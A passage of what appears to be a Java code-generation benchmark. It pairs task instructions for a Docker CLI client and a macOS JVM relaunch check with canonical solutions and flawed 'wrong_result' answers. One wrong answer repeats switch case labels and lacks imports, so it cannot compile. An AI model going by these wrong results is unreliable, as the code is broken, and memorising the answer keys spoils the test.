AllocatedPort(int port, Path path, FileChannel file, FileLock lock) {\n            this.port = port;\n            this.path = path;\n            this.file = file;\n            this.lock = lock;\n        }\n\n        public int port() {\n            return this.port;\n        }\n\n        public void release() throws IOException {\n            this.lock.release();\n            this.file.close();\n            Files.delete(this.path);\n            synchronized (TemporaryPorts.class) {\n                TemporaryPorts.this.ports.remove(this);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 290,
    "Instruction": "Task Description: Create a Java class that implements a Docker client using ProcessBuilder to interact with the Docker CLI, handling process execution, input/output streams, and error handling.\n\nClass Description: CliDockerClient is a Docker client implementation that uses ProcessBuilder to execute Docker CLI commands. It manages process creation, stream handling, and timeout control for Docker operations.\n\nAttributes:\n- processBuilderFactory: Function<List<String>, ProcessBuilder> - Factory function to create ProcessBuilder instances configured for Docker commands\n- DEFAULT_DOCKER_CLIENT: Path - Default path to the Docker executable\n- DOCKER_OUTPUT_TIMEOUT: Long - Timeout duration for Docker command execution (10 minutes)\n\nMethods:\n- CliDockerClient(Path, Map<String,String>) -> void - Constructor that initializes the client with Docker executable path and environment variables\n- CliDockerClient(Function<List<String>,ProcessBuilder>) -> void - Internal constructor accepting a ProcessBuilder factory function\n- defaultProcessBuilderFactory(String,ImmutableMap<String,String>) -> Function<List<String>,ProcessBuilder> - Creates default ProcessBuilder factory with Docker executable and environment\n- getStderrOutput(Process) -> String - Helper method to read error stream from a process\n- docker(String...) -> Process - Executes a Docker subcommand and returns the Process instance\n- info() -> DockerInfoDetails - Executes 'docker info' command and returns parsed information\n- fetchInfoDetails() -> DockerInfoDetails - Internal method to fetch and parse Docker info details",
    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.google.cloud.tools.jib.api.DescriptorDigest;\nimport com.google.cloud.tools.jib.api.DockerClient;\nimport com.google.cloud.tools.jib.api.DockerInfoDetails;\nimport com.google.cloud.tools.jib.api.ImageDetails;\nimport com.google.cloud.tools.jib.api.ImageReference;\nimport com.google.cloud.tools.jib.http.NotifyingOutputStream;\nimport com.google.cloud.tools.jib.image.ImageTarball;\nimport com.google.cloud.tools.jib.json.JsonTemplate;\nimport com.google.cloud.tools.jib.json.JsonTemplateMapper;\nimport com.google.common.collect.ImmutableMap;\nimport com.google.common.io.ByteStreams;\nimport com.google.common.io.CharStreams;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.security.DigestException;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.function.Consumer;\nimport java.util.function.Function;\n\npublic class CliDockerClient implements DockerClient {\n\n  public static final Path DEFAULT_DOCKER_CLIENT = Paths.get(\"docker\");\n  public static final Long DOCKER_OUTPUT_TIMEOUT = (long) 10 * 60 * 1000;\n\n  private final Function<List<String>, ProcessBuilder> processBuilderFactory;\n\n  public CliDockerClient(Path dockerExecutable, Map<String, String> dockerEnvironment) {\n    this(\n        defaultProcessBuilderFactory(\n            dockerExecutable.toString(), ImmutableMap.copyOf(dockerEnvironment)));\n  }\n\n  CliDockerClient(Function<List<String>, ProcessBuilder> processBuilderFactory) {\n    this.processBuilderFactory = processBuilderFactory;\n  }\n\n  private static Function<List<String>, ProcessBuilder> defaultProcessBuilderFactory(\n      String dockerExecutable, ImmutableMap<String, String> dockerEnvironment) {\n    return dockerSubCommand -> {\n      List<String> dockerCommand = new ArrayList<>(1 + dockerSubCommand.size());\n      dockerCommand.add(dockerExecutable);\n      dockerCommand.addAll(dockerSubCommand);\n\n      ProcessBuilder processBuilder = new ProcessBuilder(dockerCommand);\n      Map<String, String> environment = processBuilder.environment();\n      environment.putAll(dockerEnvironment);\n\n      return processBuilder;\n    };\n  }\n\n  private static String getStderrOutput(Process process) {\n    try (InputStreamReader stderr =\n        new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8)) {\n      return CharStreams.toString(stderr);\n    } catch (IOException ex) {\n      return \"unknown (failed to read error message from stderr due to \" + ex.getMessage() + \")\";\n    }\n  }\n\n  private Process docker(String... subCommand) throws IOException {\n    return processBuilderFactory.apply(Arrays.asList(subCommand)).start();\n  }\n\n  @Override\n  public DockerInfoDetails info() throws IOException, InterruptedException {\n    ExecutorService executor = Executors.newSingleThreadExecutor();\n    Future<DockerInfoDetails> readerFuture = executor.submit(this::fetchInfoDetails);\n    try {\n      DockerInfoDetails details = readerFuture.get(DOCKER_OUTPUT_TIMEOUT, TimeUnit.MILLISECONDS);\n      return details;\n    } catch (TimeoutException e) {\n      readerFuture.cancel(true);\n      throw new IOException(\"Timeout reached while waiting for 'docker info' output\");\n    } catch (ExecutionException e) {\n      throw new IOException(\"Failed to read output of 'docker info': \" + e.getMessage());\n    } finally {\n      executor.shutdownNow();\n    }\n  }\n\n  private DockerInfoDetails fetchInfoDetails() throws IOException, InterruptedException {\n    Process infoProcess = docker(\"info\", \"-f\", \"{{json .}}\");\n    InputStream inputStream = infoProcess.getInputStream();\n    if (infoProcess.waitFor() != 0) {\n      throw new IOException(\n          \"'docker info' command failed with error: \" + getStderrOutput(infoProcess));\n    }\n    return JsonTemplateMapper.readJson(inputStream, DockerInfoDetails.class);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\nimport java.nio.file.Path;\nimport java.util.*;\nimport java.util.concurrent.*;\nimport java.util.stream.Collectors;\n\npublic class CliDockerClient {\n    private final Function<List<String>, ProcessBuilder> processBuilderFactory;\n    private static final Path DEFAULT_DOCKER_CLIENT = Path.of(\"docker\");\n    private static final long DOCKER_OUTPUT_TIMEOUT = 10 * 60 * 1000;\n\n    public CliDockerClient(Path dockerExecutable, Map<String, String> environment) {\n        this.processBuilderFactory = defaultProcessBuilderFactory(dockerExecutable.toString(), ImmutableMap.copyOf(environment));\n    }\n\n    public CliDockerClient(Function<List<String>, ProcessBuilder> processBuilderFactory) {\n        this.processBuilderFactory = processBuilderFactory;\n    }\n\n    private static Function<List<String>, ProcessBuilder> defaultProcessBuilderFactory(String dockerExecutable, Map<String, String> environment) {\n        return command -> {\n            ProcessBuilder builder = new ProcessBuilder(command);\n            builder.redirectErrorStream(true);\n            builder.environment().putAll(environment);\n            return builder;\n        };\n    }\n\n    private static String getStderrOutput(Process process) throws IOException, InterruptedException {\n        StringBuilder output = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n        return output.toString();\n    }\n\n    public Process docker(String... command) throws IOException, InterruptedException {\n        List<String> cmdList = Arrays.asList(command);\n        ProcessBuilder builder = processBuilderFactory.apply(cmdList);\n        Process process = builder.start();\n        if (process.waitFor(DOCKER_OUTPUT_TIMEOUT, TimeUnit.MILLISECONDS)) {\n            int exitCode = process.exitValue();\n            if (exitCode != 0) {\n                String stderr = getStderrOutput(process);\n                throw new RuntimeException(\"Docker command failed with exit code \" + exitCode + \": \" + stderr);\n            }\n        } else {\n            process.destroyForcibly();\n            throw new TimeoutException(\"Docker command timed out after \" + DOCKER_OUTPUT_TIMEOUT / 1000 + \" seconds\");\n        }\n        return process;\n    }\n\n    public DockerInfoDetails info() throws IOException, InterruptedException {\n        Process process = docker(\"info\");\n        String output = readProcessOutput(process);\n        return parseInfo(output);\n    }\n\n    private String readProcessOutput(Process process) throws IOException, InterruptedException {\n        StringBuilder output = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n        return output.toString();\n    }\n\n    private DockerInfoDetails fetchInfoDetails() throws IOException, InterruptedException {\n        Process process = docker(\"info\");\n        String output = readProcessOutput(process);\n        return parseInfo(output);\n    }\n\n    private DockerInfoDetails parseInfo(String output) {\n        DockerInfoDetails details = new DockerInfoDetails();\n        String[] lines = output.split(\"\\n\");\n        for (String line : lines) {\n            String[] parts = line.split(\":\\\\s+\", 2);\n            if (parts.length < 2) continue;\n            String key = parts[0].trim();\n            String value = parts[1].trim();\n            switch (key) {\n                case \"Containers\":\n                    details.setContainers(Integer.parseInt(value));\n                    break;\n                case \"Images\":\n                    details.setImages(Integer.parseInt(value));\n                    break;\n                case \"Storage Driver\":\n                    details.setStorageDriver(value);\n                    break;\n                case \"Number of Registers\":\n                    details.setNumberOfRegisters(Integer.parseInt(value));\n                    break;\n                case \"Registry\":\n                    details.setRegistry(value);\n                    break;\n                case \"Labels\":\n                    details.setLabels(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Experimental Build\":\n                    details.setExperimentalBuild(Boolean.parseBoolean(value));\n                    break;\n                case \"Insecure Registries\":\n                    details.setInsecureRegistries(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Live Restore Enabled\":\n                    details.setLiveRestoreEnabled(Boolean.parseBoolean(value));\n                    break;\n                case \"Kernel Version\":\n                    details.setKernelVersion(value);\n                    break;\n                case \"Operating System\":\n                    details.setOperatingSystem(value);\n                    break;\n                case \"OSType\":\n                    details.setOsType(value);\n                    break;\n                case \"Architecture\":\n                    details.setArchitecture(value);\n                    break;\n                case \"CPUs\":\n                    details.setCpus(Integer.parseInt(value));\n                    break;\n                case \"Total Memory\":\n                    details.setTotalMemory(parseSize(value));\n                    break;\n                case \"Name\":\n                    details.setName(value);\n                    break;\n                case \"ID\":\n                    details.setId(value);\n                    break;\n                case \"Debug Mode\":\n                    details.setDebugMode(Boolean.parseBoolean(value));\n                    break;\n                case \"Server Version\":\n                    details.setServerVersion(value);\n                    break;\n                case \"System Time\":\n                    details.setSystemTime(value);\n                    break;\n                case \"EventsListeners\":\n                    details.setEventsListeners(Integer.parseInt(value));\n                    break;\n                case \"Runtimes\":\n                    details.setRuntimes(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Default Runtime\":\n                    details.setDefaultRuntime(value);\n                    break;\n                case \"Init Binary\":\n                    details.setInitBinary(value);\n                    break;\n                case \"Containerd Commit\":\n                    details.setContainerdCommit(value);\n                    break;\n                case \"runc Commit\":\n                    details.setRuncCommit(value);\n                    break;\n                case \"init Commit\":\n                    details.setInitCommit(value);\n                    break;\n                case \"Security Options\":\n                    details.setSecurityOptions(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Swarm\":\n                    details.setSwarm(value);\n                    break;\n                case \"Live Restore Enabled\":\n                    details.setLiveRestoreEnabled(Boolean.parseBoolean(value));\n                    break;\n                case \"Isolation\":\n                    details.setIsolation(value);\n                    break;\n                case \"Windows Version\":\n                    details.setWindowsVersion(value);\n                    break;\n                case \"Platform\":\n                    details.setPlatform(value);\n                    break;\n                case \"OSType\":\n                    details.setOsType(value);\n                    break;\n                case \"Architecture\":\n                    details.setArchitecture(value);\n                    break;\n                case \"OS Version\":\n                    details.setOsVersion(value);\n                    break;\n                case \"Kernel Version\":\n                    details.setKernelVersion(value);\n                    break;\n                case \"HTTP Proxy\":\n                    details.setHttpProxy(value);\n                    break;\n                case \"HTTPS Proxy\":\n                    details.setHttpsProxy(value);\n                    break;\n                case \"No Proxy\":\n                    details.setNoProxy(value);\n                    break;\n                case \"Registry Config\":\n                    details.setRegistryConfig(value);\n                    break;\n                case \"Plugins\":\n                    details.setPlugins(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Log Driver\":\n                    details.setLogDriver(value);\n                    break;\n                case \"Cgroup Driver\":\n                    details.setCgroupDriver(value);\n                    break;\n                case \"Cgroup Version\":\n                    details.setCgroupVersion(value);\n                    break;\n                case \"Nvidia GPUs\":\n                    details.setNvidiaGpus(Integer.parseInt(value));\n                    break;\n                case \"CPU CFS Period\":\n                    details.setCpuCfsPeriod(Integer.parseInt(value));\n                    break;\n                case \"CPU CFS Quota\":\n                    details.setCpuCfsQuota(Integer.parseInt(value));\n                    break;\n                case \"CPU Shares\":\n                    details.setCpuShares(Integer.parseInt(value));\n                    break;\n                case \"Memory Limit\":\n                    details.setMemoryLimit(parseSize(value));\n                    break;\n                case \"Memory Swap\":\n                    details.setMemorySwap(parseSize(value));\n                    break;\n                case \"Oom Kill Disable\":\n                    details.setOomKillDisable(Boolean.parseBoolean(value));\n                    break;\n                case \"CPU Set\":\n                    details.setCpuSet(value);\n                    break;\n                case \"CPU Pids Limit\":\n                    details.setCpuPidsLimit(Integer.parseInt(value));\n                    break;\n                case \"Blkio Weight\":\n                    details.setBlkioWeight(Integer.parseInt(value));\n                    break;\n                case \"Blkio Weight Device\":\n                    details.setBlkioWeightDevice(value);\n                    break;\n                case \"Blkio Device Read Bps\":\n                    details.setBlkioDeviceReadBps(value);\n                    break;\n                case \"Blkio Device Write Bps\":\n                    details.setBlkioDeviceWriteBps(value);\n                    break;\n                case \"Blkio Device Read Iops\":\n                    details.setBlkioDeviceReadIops(value);\n                    break;\n                case \"Blkio Device Write Iops\":\n                    details.setBlkioDeviceWriteIops(value);\n                    break;\n                case \"Mounts\":\n                    details.setMounts(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Devices\":\n                    details.setDevices(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Networks\":\n                    details.setNetworks(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Volumes\":\n                    details.setVolumes(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Secrets\":\n                    details.setSecrets(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Configs\":\n                    details.setConfigs(Arrays.asList(value.split(\",\")));\n                    break;\n                case \"Warnings\":\n                    details.setWarnings(Arrays.asList(value.split(\",\")));\n                    break;\n            }\n        }\n        return details;\n    }\n\n    private long parseSize(String sizeStr) {\n        if (sizeStr == null || sizeStr.isEmpty()) return 0;\n        try {\n            return Long.parseLong(sizeStr);\n        } catch (NumberFormatException e) {\n            String unit = sizeStr.substring(sizeStr.length() - 1);\n            long value = Long.parseLong(sizeStr.substring(0, sizeStr.length() - 1));\n            switch (unit) {\n                case \"K\":\n                    return value * 1024;\n                case \"M\":\n                    return value * 1024 * 1024;\n                case \"G\":\n                    return value * 1024 * 1024 * 1024;\n                case \"T\":\n                    return value * 1024 * 1024 * 1024 * 1024;\n                default:\n                    return value;\n            }\n        }\n    }\n\n    public static class DockerInfoDetails {\n        private int containers;\n        private int images;\n        private String storageDriver;\n        private int numberOfRegisters;\n        private String registry;\n        private List<String> labels;\n        private boolean experimentalBuild;\n        private List<String> insecureRegistries;\n        private boolean liveRestoreEnabled;\n        private String kernelVersion;\n        private String operatingSystem;\n        private String osType;\n        private String architecture;\n        private int cpus;\n        private long totalMemory;\n        private String name;\n        private String id;\n        private boolean debugMode;\n        private String serverVersion;\n        private String systemTime;\n        private int eventsListeners;\n        private List<String> runtimes;\n        private String defaultRuntime;\n        private String initBinary;\n        private String containerdCommit;\n        private String runcCommit;\n        private String initCommit;\n        private List<String> securityOptions;\n        private String swarm;\n        private String isolation;\n        private String windowsVersion;\n        private String platform;\n        private String osVersion;\n        private String httpProxy;\n        private String httpsProxy;\n        private String noProxy;\n        private String registryConfig;\n        private List<String> plugins;\n        private String logDriver;\n        private String cgroupDriver;\n        private String cgroupVersion;\n        private int nvidiaGpus;\n        private int cpuCfsPeriod;\n        private int cpuCfsQuota;\n        private int cpuShares;\n        private long memoryLimit;\n        private long memorySwap;\n        private boolean oomKillDisable;\n        private String cpuSet;\n        private int cpuPidsLimit;\n        private int blkioWeight;\n        private String blkioWeightDevice;\n        private String blkioDeviceReadBps;\n        private String blkioDeviceWriteBps;\n        private String blkioDeviceReadIops;\n        private String blkioDeviceWriteIops;\n        private List<String> mounts;\n        private List<String> devices;\n        private List<String> networks;\n        private List<String> volumes;\n        private List<String> secrets;\n        private List<String> configs;\n        private List<String> warnings;\n\n        public int getContainers() {\n            return containers;\n        }\n\n        public void setContainers(int containers) {\n            this.containers = containers;\n        }\n\n        public int getImages() {\n            return images;\n        }\n\n        public void setImages(int images) {\n            this.images = images;\n        }\n\n        public String getStorageDriver() {\n            return storageDriver;\n        }\n\n        public void setStorageDriver(String storageDriver) {\n            this.storageDriver = storageDriver;\n        }\n\n        public int getNumberOfRegisters() {\n            return numberOfRegisters;\n        }\n\n        public void setNumberOfRegisters(int numberOfRegisters) {\n            this.numberOfRegisters = numberOfRegisters;\n        }\n\n        public String getRegistry() {\n            return registry;\n        }\n\n        public void setRegistry(String registry) {\n            this.registry = registry;\n        }\n\n        public List<String> getLabels() {\n            return labels;\n        }\n\n        public void setLabels(List<String> labels) {\n            this.labels = labels;\n        }\n\n        public boolean isExperimentalBuild() {\n            return experimentalBuild;\n        }\n\n        public void setExperimentalBuild(boolean experimentalBuild) {\n            this.experimentalBuild = experimentalBuild;\n        }\n\n        public List<String> getInsecureRegistries() {\n            return insecureRegistries;\n        }\n\n        public void setInsecureRegistries(List<String> insecureRegistries) {\n            this.insecureRegistries = insecureRegistries;\n        }\n\n        public boolean isLiveRestoreEnabled() {\n            return liveRestoreEnabled;\n        }\n\n        public void setLiveRestoreEnabled(boolean liveRestoreEnabled) {\n            this.liveRestoreEnabled = liveRestoreEnabled;\n        }\n\n        public String getKernelVersion() {\n            return kernelVersion;\n        }\n\n        public void setKernelVersion(String kernelVersion) {\n            this.kernelVersion = kernelVersion;\n        }\n\n        public String getOperatingSystem() {\n            return operatingSystem;\n        }\n\n        public void setOperatingSystem(String operatingSystem) {\n            this.operatingSystem = operatingSystem;\n        }\n\n        public String getOsType() {\n            return osType;\n        }\n\n        public void setOsType(String osType) {\n            this.osType = osType;\n        }\n\n        public String getArchitecture() {\n            return architecture;\n        }\n\n        public void setArchitecture(String architecture) {\n            this.architecture = architecture;\n        }\n\n        public int getCpus() {\n            return cpus;\n        }\n\n        public void setCpus(int cpus) {\n            this.cpus = cpus;\n        }\n\n        public long getTotalMemory() {\n            return totalMemory;\n        }\n\n        public void setTotalMemory(long totalMemory) {\n            this.totalMemory = totalMemory;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public void setName(String name) {\n            this.name = name;\n        }\n\n        public String getId() {\n            return id;\n        }\n\n        public void setId(String id) {\n            this.id = id;\n        }\n\n        public boolean isDebugMode() {\n            return debugMode;\n        }\n\n        public void setDebugMode(boolean debugMode) {\n            this.debugMode = debugMode;\n        }\n\n        public String getServerVersion() {\n            return serverVersion;\n        }\n\n        public void setServerVersion(String serverVersion) {\n            this.serverVersion = serverVersion;\n        }\n\n        public String getSystemTime() {\n            return systemTime;\n        }\n\n        public void setSystemTime(String systemTime) {\n            this.systemTime = systemTime;\n        }\n\n        public int getEventsListeners() {\n            return eventsListeners;\n        }\n\n        public void setEventsListeners(int eventsListeners) {\n            this.eventsListeners = eventsListeners;\n        }\n\n        public List<String> getRuntimes() {\n            return runtimes;\n        }\n\n        public void setRuntimes(List<String> runtimes) {\n            this.runtimes = runtimes;\n        }\n\n        public String getDefaultRuntime() {\n            return defaultRuntime;\n        }\n\n        public void setDefaultRuntime(String defaultRuntime) {\n            this.defaultRuntime = defaultRuntime;\n        }\n\n        public String getInitBinary() {\n            return initBinary;\n        }\n\n        public void setInitBinary(String initBinary) {\n            this.initBinary = initBinary;\n        }\n\n        public String getContainerdCommit() {\n            return containerdCommit;\n        }\n\n        public void setContainerdCommit(String containerdCommit) {\n            this.containerdCommit = containerdCommit;\n        }\n\n        public String getRuncCommit() {\n            return runcCommit;\n        }\n\n        public void setRuncCommit(String runcCommit) {\n            this.runcCommit = runcCommit;\n        }\n\n        public String getInitCommit() {\n            return initCommit;\n        }\n\n        public void setInitCommit(String initCommit) {\n            this.initCommit = initCommit;\n        }\n\n        public List<String> getSecurityOptions() {\n            return securityOptions;\n        }\n\n        public void setSecurityOptions(List<String> securityOptions) {\n            this.securityOptions = securityOptions;\n        }\n\n        public String getSwarm() {\n            return swarm;\n        }\n\n        public void setSwarm(String swarm) {\n            this.swarm = swarm;\n        }\n\n        public String getIsolation() {\n            return isolation;\n        }\n\n        public void setIsolation(String isolation) {\n            this.isolation = isolation;\n        }\n\n        public String getWindowsVersion() {\n            return windowsVersion;\n        }\n\n        public void setWindowsVersion(String windowsVersion) {\n            this.windowsVersion = windowsVersion;\n        }\n\n        public String getPlatform() {\n            return platform;\n        }\n\n        public void setPlatform(String platform) {\n            this.platform = platform;\n        }\n\n        public String getOsVersion() {\n            return osVersion;\n        }\n\n        public void setOsVersion(String osVersion) {\n            this.osVersion = osVersion;\n        }\n\n        public String getHttpProxy() {\n            return httpProxy;\n        }\n\n        public void setHttpProxy(String httpProxy) {\n            this.httpProxy = httpProxy;\n        }\n\n        public String getHttpsProxy() {\n            return httpsProxy;\n        }\n\n        public void setHttpsProxy(String httpsProxy) {\n            this.httpsProxy = httpsProxy;\n        }\n\n        public String getNoProxy() {\n            return noProxy;\n        }\n\n        public void setNoProxy(String noProxy) {\n            this.noProxy = noProxy;\n        }\n\n        public String getRegistryConfig() {\n            return registryConfig;\n        }\n\n        public void setRegistryConfig(String registryConfig) {\n            this.registryConfig = registryConfig;\n        }\n\n        public List<String> getPlugins() {\n            return plugins;\n        }\n\n        public void setPlugins(List<String> plugins) {\n            this.plugins = plugins;\n        }\n\n        public String getLogDriver() {\n            return logDriver;\n        }\n\n        public void setLogDriver(String logDriver) {\n            this.logDriver = logDriver;\n        }\n\n        public String getCgroupDriver() {\n            return cgroupDriver;\n        }\n\n        public void setCgroupDriver(String cgroupDriver) {\n            this.cgroupDriver = cgroupDriver;\n        }\n\n        public String getCgroupVersion() {\n            return cgroupVersion;\n        }\n\n        public void setCgroupVersion(String cgroupVersion) {\n            this.cgroupVersion = cgroupVersion;\n        }\n\n        public int getNvidiaGpus() {\n            return nvidiaGpus;\n        }\n\n        public void setNvidiaGpus(int nvidiaGpus) {\n            this.nvidiaGpus = nvidiaGpus;\n        }\n\n        public int getCpuCfsPeriod() {\n            return cpuCfsPeriod;\n        }\n\n        public void setCpuCfsPeriod(int cpuCfsPeriod) {\n            this.cpuCfsPeriod = cpuCfsPeriod;\n        }\n\n        public int getCpuCfsQuota() {\n            return cpuCfsQuota;\n        }\n\n        public void setCpuCfsQuota(int cpuCfsQuota) {\n            this.cpuCfsQuota = cpuCfsQuota;\n        }\n\n        public int getCpuShares() {\n            return cpuShares;\n        }\n\n        public void setCpuShares(int cpuShares) {\n            this.cpuShares = cpuShares;\n        }\n\n        public long getMemoryLimit() {\n            return memoryLimit;\n        }\n\n        public void setMemoryLimit(long memoryLimit) {\n            this.memoryLimit = memoryLimit;\n        }\n\n        public long getMemorySwap() {\n            return memorySwap;\n        }\n\n        public void setMemorySwap(long memorySwap) {\n            this.memorySwap = memorySwap;\n        }\n\n        public boolean isOomKillDisable() {\n            return oomKillDisable;\n        }\n\n        public void setOomKillDisable(boolean oomKillDisable) {\n            this.oomKillDisable = oomKillDisable;\n        }\n\n        public String getCpuSet() {\n            return cpuSet;\n        }\n\n        public void setCpuSet(String cpuSet) {\n            this.cpuSet = cpuSet;\n        }\n\n        public int getCpuPidsLimit() {\n            return cpuPidsLimit;\n        }\n\n        public void setCpuPidsLimit(int cpuPidsLimit) {\n            this.cpuPidsLimit = cpuPidsLimit;\n        }\n\n        public int getBlkioWeight() {\n            return blkioWeight;\n        }\n\n        public void setBlkioWeight(int blkioWeight) {\n            this.blkioWeight = blkioWeight;\n        }\n\n        public String getBlkioWeightDevice() {\n            return blkioWeightDevice;\n        }\n\n        public void setBlkioWeightDevice(String blkioWeightDevice) {\n            this.blkioWeightDevice = blkioWeightDevice;\n        }\n\n        public String getBlkioDeviceReadBps() {\n            return blkioDeviceReadBps;\n        }\n\n        public void setBlkioDeviceReadBps(String blkioDeviceReadBps) {\n            this.blkioDeviceReadBps = blkioDeviceReadBps;\n        }\n\n        public String getBlkioDeviceWriteBps() {\n            return blkioDeviceWriteBps;\n        }\n\n        public void setBlkioDeviceWriteBps(String blkioDeviceWriteBps) {\n            this.blkioDeviceWriteBps = blkioDeviceWriteBps;\n        }\n\n        public String getBlkioDeviceReadIops() {\n            return blkioDeviceReadIops;\n        }\n\n        public void setBlkioDeviceReadIops(String blkioDeviceReadIops) {\n            this.blkioDeviceReadIops = blkioDeviceReadIops;\n        }\n\n        public String getBlkioDeviceWriteIops() {\n            return blkioDeviceWriteIops;\n        }\n\n        public void setBlkioDeviceWriteIops(String blkioDeviceWriteIops) {\n            this.blkioDeviceWriteIops = blkioDeviceWriteIops;\n        }\n\n        public List<String> getMounts() {\n            return mounts;\n        }\n\n        public void setMounts(List<String> mounts) {\n            this.mounts = mounts;\n        }\n\n        public List<String> getDevices() {\n            return devices;\n        }\n\n        public void setDevices(List<String> devices) {\n            this.devices = devices;\n        }\n\n        public List<String> getNetworks() {\n            return networks;\n        }\n\n        public void setNetworks(List<String> networks) {\n            this.networks = networks;\n        }\n\n        public List<String> getVolumes() {\n            return volumes;\n        }\n\n        public void setVolumes(List<String> volumes) {\n            this.volumes = volumes;\n        }\n\n        public List<String> getSecrets() {\n            return secrets;\n        }\n\n        public void setSecrets(List<String> secrets) {\n            this.secrets = secrets;\n        }\n\n        public List<String> getConfigs() {\n            return configs;\n        }\n\n        public void setConfigs(List<String> configs) {\n            this.configs = configs;\n        }\n\n        public List<String> getWarnings() {\n            return warnings;\n        }\n\n        public void setWarnings(List<String> warnings) {\n            this.warnings = warnings;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Verify and ensure the Java Virtual Machine (JVM) is running on the first thread on macOS, relaunching the process if necessary with the correct arguments.\n\nFunction Description: This function checks if the JVM is running on the first thread on macOS, which is required for proper execution of certain applications. If not, it attempts to relaunch the process with the \"-XstartOnFirstThread\" argument. The function handles process creation, stream redirection, and output/error handling during the relaunch.\n\nInput: \n- args: String[] - Command-line arguments to be passed to the relaunched process (if needed)\n\nOutput: \n- boolean - Returns true if the JVM is already in a valid state (either not on macOS or already running on first thread), or false if a relaunch was attempted (the original process should exit in this case)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.lang.management.ManagementFactory;\n\npublic static boolean verifyValidJVMState(String[] args){\n    if (SharedLibraryLoader.isMac){\n        if (\"1\".equals(System.getenv(\"JAVA_STARTED_ON_FIRST_THREAD_\" +\n                ManagementFactory.getRuntimeMXBean().getName().split(\"@\")[0]))) {\n            return true;\n        }\n\n        if (\"true\".equals(System.getProperty(\"shpdRelaunched\"))){\n            System.err.println(\"Error: Could not verify new process is running on the first thread. Trying to run the game anyway...\");\n            return true;\n        }\n\n        String sep = System.getProperty(\"file.separator\");\n\n        ArrayList<String> jvmArgs = new ArrayList<>();\n        jvmArgs.add(System.getProperty(\"java.home\") + sep + \"bin\" + sep + \"java\");\n        jvmArgs.add(\"-XstartOnFirstThread\");\n        jvmArgs.add(\"-DshpdRelaunched=true\");\n        jvmArgs.addAll(ManagementFactory.getRuntimeMXBean().getInputArguments());\n        jvmArgs.add(\"-cp\");\n        jvmArgs.add(System.getProperty(\"java.class.path\"));\n        jvmArgs.add(DesktopLauncher.class.getName());\n\n        System.err.println(\"Error: ShatteredPD must start on the first thread in order to work on macOS.\");\n        System.err.println(\"  To avoid this error, run the game with the \\\"-XstartOnFirstThread\\\" argument\");\n        System.err.println(\"  Now attempting to relaunch the game on the first thread automatically:\\n\");\n\n        try {\n            Process process = new ProcessBuilder(jvmArgs).redirectErrorStream(true).start();\n            BufferedReader out = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n\n            while ((line = out.readLine()) != null) {\n                if (line.toLowerCase().startsWith(\"error\")){\n                    System.err.println(line);\n                } else {\n                    System.out.println(line);\n                }\n            }\n\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return false;\n    }\n\n    return true;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic class JvmThreadChecker {\n    public static boolean checkAndRelaunch(String[] args) {\n        if (!System.getProperty(\"os.name\").toLowerCase().contains(\"mac\")) {\n            return true;\n        }\n        try {\n            ProcessBuilder pb = new ProcessBuilder();\n            String javaHome = System.getProperty(\"java.home\");\n            String javaBin = javaHome + \"/bin/java\";\n            String className = System.getProperty(\"sun.java.command\");\n            String[] cmd = {javaBin, \"-XstartOnFirstThread\", className};\n            for (String arg : args) {\n                cmd = append(cmd, arg);\n            }\n            pb.command(cmd);\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            int exitCode = process.waitFor();\n            System.exit(exitCode);\n        } catch (Exception e) {\n            return false;\n        }\n        return false;\n    }\n\n    private static <T> T[] append(T[] array, T element) {\n        @SuppressWarnings(\"unchecked\")\n        T[] result = (T[]) java.lang.reflect.Array.newInstance(array.getClass().getComponentType(), array.length + 1);\n        System.arraycopy(array, 0, result, 0, array.length);\n        result[array.length] = element;\n        return result;\n    }\n}\n```"
  },
  {
    "Task_id": 295,
